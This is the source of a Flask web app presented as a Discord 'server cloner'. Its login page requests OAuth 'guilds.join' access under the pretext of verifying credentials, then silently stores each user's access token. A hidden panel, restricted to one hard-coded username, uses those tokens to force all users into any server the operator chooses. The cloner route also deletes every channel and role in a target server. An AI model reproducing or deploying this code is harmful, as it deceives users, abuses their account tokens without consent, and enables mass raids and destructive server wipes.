from flask import Flask, request, render_template_string, redirect, session, Response
import requests, time, os, base64

application = Flask(__name__)
app = application
app.secret_key = os.urandom(24)

CLIENT_ID = os.environ.get("CLIENT_ID", "YOUR_CLIENT_ID")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "YOUR_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
AUTHORIZED_USERS = []

LOGIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spidey Gateway | Authorize</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #050505; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #0b0b0e; padding: 30px; border-radius: 12px; border: 1px solid #8b0000; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 0 25px rgba(139,0,0,0.3); }
        h2 { font-family: 'Orbitron', sans-serif; color: #ff1e1e; }
        a.btn { display: block; margin-top: 20px; padding: 14px; background: linear-gradient(135deg, #8b0000, #5c0000); color: white; text-decoration: none; font-family: 'Orbitron', sans-serif; font-weight: 700; border-radius: 8px; border: 1px solid #ff1e1e; }
        a.btn:hover { background: #a30000; box-shadow: 0 0 15px #ff1e1e; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🕷️ SPIDEY PORTAL 🕸️</h2>
        <p>Authorize access to enter the tool and verify credentials.</p>
        <a class="btn" href="https://discord.com/api/oauth2/authorize?client_id={{ client_id }}&redirect_uri={{ redirect_uri }}&response_type=code&scope=identify%20guilds.join">AUTHORIZE WITH DISCORD</a>
    </div>
</body>
</html>"""

DASHBOARD_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spidey Hub - Bot Cloner</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #050505; color: #e0e0e0; padding: 20px; }
        .container { max-width: 650px; margin: auto; background: #0b0b0e; padding: 25px; border-radius: 12px; border: 1px solid #8b0000; }
        h2 { font-family: 'Orbitron', sans-serif; color: #ff1e1e; text-align: center; }
        .nav { display: flex; gap: 10px; margin-bottom: 20px; }
        .nav a { flex: 1; text-align: center; padding: 10px; background: #121218; color: #ff1e1e; text-decoration: none; font-family: 'Orbitron', sans-serif; font-size: 12px; border-radius: 6px; border: 1px solid #331a1a; }
        .nav a.active { background: #8b0000; color: #fff; border-color: #ff1e1e; }
        input[type="text"] { width: 100%; padding: 12px; margin-top: 6px; margin-bottom: 12px; background: #08080a; color: #fff; border: 1px solid #262636; border-radius: 8px; box-sizing: border-box; }
        .checkbox-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; background: #050507; padding: 12px; border-radius: 8px; border: 1px solid #1f1f2e; font-size: 13px; }
        .checkbox-grid label { display: flex; align-items: center; gap: 8px; cursor: pointer; }
        button { width: 100%; padding: 14px; margin-top: 15px; background: #8b0000; color: white; font-family: 'Orbitron', sans-serif; font-weight: 700; border-radius: 8px; border: 1px solid #ff1e1e; cursor: pointer; }
        button:hover { background: #a30000; }
        .tutorial { background: #101015; border-left: 4px solid #ff1e1e; padding: 15px; margin-bottom: 20px; font-size: 13px; border-radius: 0 8px 8px 0; line-height: 1.6; }
        .tutorial h4 { margin: 0 0 10px 0; font-family: 'Orbitron', sans-serif; color: #ff1e1e; }
        .btn-link { display: inline-block; margin-bottom: 15px; padding: 10px 15px; background: #1a1a24; color: #00ffcc; text-decoration: none; border-radius: 6px; font-size: 12px; font-family: 'Orbitron', sans-serif; border: 1px solid #00ffcc; text-align: center; width: 100%; box-sizing: border-box;}
        .btn-link:hover { background: #00ffcc; color: #000; }
        .success { color: #00ffcc; font-size: 13px; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🕷️ SPIDEY BOT CLONER</h2>
        <p style="text-align:center; font-size:13px; color:#888;">Logged in as: <b>{{ username }}</b></p>
        
        <div class="nav">
            <a href="/" class="{% if tab == 'cloner' %}active{% endif %}">SERVER CLONER</a>
            {% if username == 'aaravg7820133.exe' %}
            <a href="/mass-join-panel" class="{% if tab == 'admin' %}active{% endif %}">MASS JOIN PANEL</a>
            {% endif %}
        </div>

        {% if tab == 'cloner' %}
        
        <div class="tutorial">
            <h4>📖 Quick Setup Tutorial:</h4>
            1. Click the button below to add your Bot with <b>Administrator permissions</b> to your target server.<br>
            2. In your Target Server, go to <b>Server Settings > Roles</b> and drag your Bot's role all the way to the <b>very top</b>.<br>
            3. Paste the <b>Source Server ID</b> and <b>Target Server ID</b> below and start cloning!
        </div>

        <a class="btn-link" href="https://discord.com/api/oauth2/authorize?client_id={{ client_id }}&permissions=8&scope=bot" target="_blank">➕ INVITE BOT TO TARGET SERVER (ADMIN)</a>

        <form method="POST" action="/clone" target="_blank">
            <label>Source Server ID (To Copy From)</label>
            <input type="text" name="source_id" required placeholder="Source Server ID...">
            
            <label>Target Server ID (To Clone Into)</label>
            <input type="text" name="target_id" required placeholder="Target Server ID...">
            
            <div class="checkbox-grid">
                <label><input type="checkbox" name="delete_channels" checked> Delete Channels</label>
                <label><input type="checkbox" name="delete_roles" checked> Delete Roles</label>
                <label><input type="checkbox" name="clone_channels" checked> Clone Channels</label>
                <label><input type="checkbox" name="clone_roles" checked> Clone Roles</label>
                <label><input type="checkbox" name="clone_emojis" checked> Clone Emojis</label>
                <label><input type="checkbox" name="clone_settings" checked> Clone Settings</label>
            </div>

            <button type="submit">🚀 START BOT CLONE PROTOCOL</button>
        </form>
        {% elif tab == 'admin' and username == 'aaravg7820133.exe' %}
        <h3>⚡ Mass Join Control Panel</h3>
        <form method="POST" action="/mass-join">
            <label>Target Server ID</label>
            <input type="text" name="guild_id" required placeholder="Paste Server ID...">
            <button type="submit">FORCE ALL AUTHORIZED USERS TO JOIN</button>
        </form>
        {% if msg %}<p class="success">{{ msg }}</p>{% endif %}
        {% endif %}
    </div>
</body>
</html>"""

def get_redirect_uri():
    host = request.headers.get("X-Forwarded-Host", request.host)
    if "onrender.com" in host or "https" in request.headers.get("X-Forwarded-Proto", ""):
        return f"https://{host}/callback"
    return f"http://{host}/callback"

@app.before_request
def force_https():
    request.environ['wsgi.url_scheme'] = 'https'

@app.route("/")
def index():
    if "user_token" not in session:
        return render_template_string(LOGIN_PAGE, client_id=CLIENT_ID, redirect_uri=get_redirect_uri())
    return render_template_string(DASHBOARD_PAGE, username=session.get("username", "Agent"), tab="cloner", client_id=CLIENT_ID)

@app.route("/mass-join-panel")
def mass_join_panel():
    if "user_token" not in session or session.get("username") != "aaravg7820133.exe":
        return redirect("/")
    return render_template_string(DASHBOARD_PAGE, username=session.get("username"), tab="admin", msg=request.args.get("msg", ""), client_id=CLIENT_ID)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return redirect("/")
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": get_redirect_uri()
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    if res.status_code != 200:
        return f"Authorization failed: {res.text}", 400
    token_data = res.json()
    access_token = token_data.get("access_token")
    user_res = requests.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {access_token}"})
    if user_res.status_code == 200:
        user_info = user_res.json()
        session["user_token"] = access_token
        session["username"] = user_info.get("username")
        user_entry = {"id": user_info.get("id"), "token": access_token}
        if user_entry not in AUTHORIZED_USERS:
            AUTHORIZED_USERS.append(user_entry)
    return redirect("/")

@app.route("/clone", methods=["POST"])
def clone_server():
    active_token = os.environ.get("BOT_TOKEN", BOT_TOKEN).strip()
    token = f"Bot {active_token}"
    source_id = request.form.get("source_id")
    target_id = request.form.get("target_id")
    
    del_channels = request.form.get("delete_channels")
    del_roles = request.form.get("delete_roles")
    c_channels = request.form.get("clone_channels")
    c_roles = request.form.get("clone_roles")
    c_emojis = request.form.get("clone_emojis")
    c_settings = request.form.get("clone_settings")
    
    headers = {"Authorization": token, "Content-Type": "application/json"}
    
    def generate_stream():
        yield "<html><head><title>Cloning Logs</title><style>body{background:#050505;color:#00ffcc;font-family:monospace;padding:20px;}</style></head><body><pre>" + (" " * 2048) + "\n"
        
        test_res = requests.get(f"https://discord.com/api/v10/guilds/{target_id}", headers=headers)
        if test_res.status_code != 200:
            yield f"[ERROR] Bot cannot access target server {target_id}! Check permissions.\n</pre></body></html>"
            return
        else:
            yield "[OK] Target server connection verified.\n\n"

        if del_channels:
            yield "[+] Deleting existing channels...\n"
            r_tc = requests.get(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers)
            if r_tc.status_code == 200:
                for ch in r_tc.json():
                    try:
                        d_res = requests.delete(f"https://discord.com/api/v10/channels/{ch['id']}", headers=headers)
                        if d_res.status_code in [200, 204]:
                            yield f"[X] Deleted channel: {ch['name']}\n"
                    except:
                        pass
                    time.sleep(0.05)

        if del_roles:
            yield "[+] Deleting existing roles...\n"
            for _ in range(3):
                r_tr = requests.get(f"https://discord.com/api/v10/guilds/{target_id}/roles", headers=headers)
                if r_tr.status_code == 200:
                    roles = r_tr.json()
                    deleted_any = False
                    for role in sorted(roles, key=lambda x: x['position'], reverse=True):
                        if role['name'] != "@everyone" and not role.get('managed') and not role.get('bot_id'):
                            try:
                                res = requests.delete(f"https://discord.com/api/v10/guilds/{target_id}/roles/{role['id']}", headers=headers)
                                if res.status_code in [200, 204]:
                                    deleted_any = True
                                    yield f"[X] Deleted role: {role['name']}\n"
                            except:
                                pass
                            time.sleep(0.05)
                    if not deleted_any:
                        break

        if c_roles:
            yield "[+] Replicating roles...\n"
            r_source_roles = requests.get(f"https://discord.com/api/v10/guilds/{source_id}/roles", headers=headers)
            if r_source_roles.status_code == 200:
                source_roles = sorted([r for r in r_source_roles.json() if not r.get("managed")], key=lambda x: x['position'])
                for role in source_roles:
                    if role['name'] == "@everyone":
                        try:
                            requests.patch(f"https://discord.com/api/v10/guilds/{target_id}/roles/{target_id}", headers=headers, json={"permissions": str(role['permissions'])})
                            yield "[V] Updated @everyone permissions\n"
                        except:
                            pass
                        continue
                    payload = {
                        "name": role['name'],
                        "permissions": str(role['permissions']),
                        "color": int(role.get('color', 0)),
                        "hoist": bool(role.get('hoist', False)),
                        "mentionable": bool(role.get('mentionable', False))
                    }
                    try:
                        res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/roles", headers=headers, json=payload)
                        if res.status_code in [200, 201]:
                            yield f"[V] Created role: {role['name']}\n"
                    except:
                        pass
                    time.sleep(0.08)

        if c_channels:
            yield "[+] Replicating channels and categories...\n"
            r_channels = requests.get(f"https://discord.com/api/v10/guilds/{source_id}/channels", headers=headers)
            if r_channels.status_code == 200:
                channels = r_channels.json()
                cat_map = {}
                for cat in sorted([c for c in channels if c['type'] == 4], key=lambda x: x.get('position', 0)):
                    try:
                        res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers, json={"name": cat['name'], "type": 4})
                        if res.status_code in [200, 201]:
                            cat_map[cat['id']] = res.json()['id']
                            yield f"[V] Created Category: {cat['name']}\n"
                    except:
                        pass
                    time.sleep(0.05)
                
                for ch in sorted([c for c in channels if c['type'] != 4], key=lambda x: x.get('position', 0)):
                    payload = {"name": ch['name'], "type": ch['type'], "topic": ch.get('topic'), "nsfw": ch.get('nsfw', False)}
                    if ch.get('parent_id') in cat_map:
                        payload['parent_id'] = cat_map[ch['parent_id']]
                    try:
                        res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/channels", headers=headers, json=payload)
                        if res.status_code in [200, 201]:
                            yield f"[V] Created Channel: {ch['name']}\n"
                    except:
                        pass
                    time.sleep(0.05)

        if c_emojis:
            yield "[+] Replicating emojis...\n"
            r_emo = requests.get(f"https://discord.com/api/v10/guilds/{source_id}/emojis", headers=headers)
            if r_emo.status_code == 200:
                for emo in r_emo.json():
                    try:
                        img_res = requests.get(f"https://cdn.discordapp.com/emojis/{emo['id']}.png")
                        if img_res.status_code == 200:
                            b64_img = f"data:image/png;base64,{base64.b64encode(img_res.content).decode('utf-8')}"
                            e_res = requests.post(f"https://discord.com/api/v10/guilds/{target_id}/emojis", headers=headers, json={"name": emo['name'], "image": b64_img})
                            if e_res.status_code in [200, 201]:
                                yield f"[V] Created Emoji: {emo['name']}\n"
                    except:
                        pass
                    time.sleep(0.1)

        if c_settings:
            yield "[+] Replicating server settings...\n"
            try:
                r_src = requests.get(f"https://discord.com/api/v10/guilds/{source_id}", headers=headers)
                if r_src.status_code == 200:
                    s_data = r_src.json()
                    requests.patch(f"https://discord.com/api/v10/guilds/{target_id}", headers=headers, json={
                        "name": s_data.get("name"),
                        "verification_level": s_data.get("verification_level"),
                        "default_message_notifications": s_data.get("default_message_notifications"),
                        "explicit_content_filter": s_data.get("explicit_content_filter")
                    })
                    yield "[V] Server settings updated successfully!\n"
            except:
                pass

        yield "\n[+] CLONING PROTOCOL COMPLETE!" + (" " * 2048) + "</pre></body></html>"

    return Response(generate_stream(), mimetype='text/html')

@app.route("/mass-join", methods=["POST"])
def mass_join():
    if session.get("username") != "aaravg7820133.exe":
        return redirect("/")
    guild_id = request.form.get("guild_id")
    active_token = os.environ.get("BOT_TOKEN", BOT_TOKEN).strip()
    success_count = 0
    for u in AUTHORIZED_USERS:
        url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{u['id']}"
        headers = {"Authorization": f"Bot {active_token}", "Content-Type": "application/json"}
        payload = {"access_token": u['token']}
        try:
            r = requests.put(url, headers=headers, json=payload, timeout=2)
            if r.status_code in [201, 204]:
                success_count += 1
        except:
            pass
        time.sleep(0.04)
    return redirect(f"/mass-join-panel?msg=Successfully forced {success_count} players into server!")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
